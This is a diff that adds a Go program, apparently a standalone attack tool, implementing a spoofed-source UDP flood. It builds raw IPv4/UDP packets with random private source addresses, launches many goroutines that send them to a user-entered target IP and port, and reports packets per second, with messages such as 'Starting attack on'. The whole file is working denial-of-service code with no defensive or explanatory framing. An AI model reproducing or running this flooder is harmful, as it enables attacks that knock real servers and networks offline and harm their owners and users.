@@ -1,0 +1,160 @@
+package main
+
+import (
+	"bufio"
+	"encoding/binary"
+	"fmt"
+	"log"
+	"math/rand"
+	"net"
+	"os"
+	"os/signal"
+	"runtime"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"syscall"
+	"time"
+)
+
+var (
+	sent    uint64
+	stop    uint32
+	fd      int
+	addr    syscall.SockaddrInet4
+	iface   string
+	workers int
+)
+
+func getInterface() string {
+	ifaces, err := net.Interfaces()
+	if err != nil {
+		return "eth0"
+	}
+	for _, i := range ifaces {
+		if i.Flags&net.FlagUp != 0 && i.Flags&net.FlagLoopback == 0 {
+			addrs, _ := i.Addrs()
+			if len(addrs) > 0 {
+				return i.Name
+			}
+		}
+	}
+	return "eth0"
+}
+
+func setupRaw(targetIP string, targetPort int) {
+	var err error
+	fd, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
+	if err != nil {
+		log.Fatal(err)
+	}
+	iface = getInterface()
+	syscall.SetsockoptString(fd, syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, iface)
+	syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
+	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 134217728)
+	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 134217728)
+	tip := net.ParseIP(targetIP).To4()
+	copy(addr.Addr[:], tip)
+	addr.Port = targetPort
+	workers = runtime.NumCPU() * 8
+}
+
+func craft(src, dst net.IP, sport, dport int) []byte {
+	buf := make([]byte, 28)
+	ip := buf[:20]
+	ip[0] = 0x45
+	ip[1] = 0x00
+	binary.BigEndian.PutUint16(ip[2:4], 28)
+	binary.BigEndian.PutUint16(ip[4:6], uint16(rand.Intn(65535)))
+	ip[6] = 0x40
+	ip[8] = 0x40
+	ip[9] = syscall.IPPROTO_UDP
+	copy(ip[12:16], src)
+	copy(ip[16:20], dst)
+	udp := buf[20:28]
+	binary.BigEndian.PutUint16(udp[0:2], uint16(sport))
+	binary.BigEndian.PutUint16(udp[2:4], uint16(dport))
+	binary.BigEndian.PutUint16(udp[4:6], 8)
+	psum := uint32(0)
+	for i := 0; i < 4; i += 2 {
+		psum += uint32(binary.BigEndian.Uint16(src[i:]))
+	}
+	for i := 0; i < 4; i += 2 {
+		psum += uint32(binary.BigEndian.Uint16(dst[i:]))
+	}
+	psum += uint32(syscall.IPPROTO_UDP) + 8
+	for i := 20; i < 28; i += 2 {
+		if i+1 < 28 {
+			psum += uint32(binary.BigEndian.Uint16(buf[i:]))
+		} else {
+			psum += uint32(buf[i]) << 8
+		}
+	}
+	for psum>>16 > 0 {
+		psum = (psum & 0xffff) + (psum >> 16)
+	}
+	udp[6] = byte(^uint16(psum) >> 8)
+	udp[7] = byte(^uint16(psum))
+	csum := uint32(0)
+	for i := 0; i < 20; i += 2 {
+		csum += uint32(binary.BigEndian.Uint16(ip[i:]))
+	}
+	for csum>>16 > 0 {
+		csum = (csum & 0xffff) + (csum >> 16)
+	}
+	binary.BigEndian.PutUint16(ip[10:12], ^uint16(csum))
+	return buf
+}
+
+func sender(id int, wg *sync.WaitGroup, dst net.IP, dport int) {
+	defer wg.Done()
+	r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
+	packets := make([][]byte, 1024)
+	for i := range packets {
+		src := net.IPv4(10, byte(r.Intn(256)), byte(r.Intn(256)), byte(r.Intn(254)+1)).To4()
+		packets[i] = craft(src, dst, 1024+r.Intn(64512), dport)
+	}
+	for atomic.LoadUint32(&stop) == 0 {
+		for _, pkt := range packets {
+			syscall.Sendto(fd, pkt, 0, &addr)
+		}
+		atomic.AddUint64(&sent, uint64(len(packets)))
+		if sent%1000000 == 0 {
+			time.Sleep(time.Microsecond * time.Duration(r.Intn(50)))
+		}
+	}
+}
+
+func main() {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("Target IP: ")
+	targetIP, _ := reader.ReadString('\n')
+	targetIP = strings.TrimSpace(targetIP)
+	fmt.Print("Target Port: ")
+	var targetPort int
+	fmt.Scanf("%d", &targetPort)
+	fmt.Printf("Starting attack on %s:%d...\n", targetIP, targetPort)
+	setupRaw(targetIP, targetPort)
+	defer syscall.Close(fd)
+	var wg sync.WaitGroup
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go sender(i, &wg, net.ParseIP(targetIP).To4(), targetPort)
+	}
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
+	ticker := time.NewTicker(time.Second)
+	defer ticker.Stop()
+	fmt.Println("Attack running. Press Ctrl+C to stop.")
+	for atomic.LoadUint32(&stop) == 0 {
+		select {
+		case <-sig:
+			atomic.StoreUint32(&stop, 1)
+		case <-ticker.C:
+			s := atomic.SwapUint64(&sent, 0)
+			log.Printf("pps: %d", s)
+		}
+	}
+	wg.Wait()
+	fmt.Println("Attack stopped.")
+}
